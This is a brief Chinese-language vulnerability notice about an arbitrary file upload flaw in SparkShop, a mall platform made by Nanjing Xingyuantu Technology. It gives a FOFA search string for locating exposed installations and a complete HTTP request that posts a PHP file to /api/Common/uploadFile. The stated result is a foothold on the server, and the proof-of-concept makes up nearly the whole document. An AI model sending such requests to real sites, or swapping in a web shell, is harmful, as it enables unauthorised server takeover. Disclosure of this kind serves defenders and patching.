# 南京星源图科技SparkShop存在任意文件上传漏洞

南京星源图科技SparkShop商城存在任意文件上传漏洞，攻击者可获取服务器权限。

## fofa

```yaml
"SparkShop"
```

## poc

```java
POST /api/Common/uploadFile HTTP/2
Host: 
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Length: 178

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file";filename="1.php"

<?php echo"hello world";?>
------WebKitFormBoundaryj7OlOPiiukkdktZR--
```



## 漏洞来源

- https://mp.weixin.qq.com/s/xrdAT9NE6Z5s7OoiJdnd-w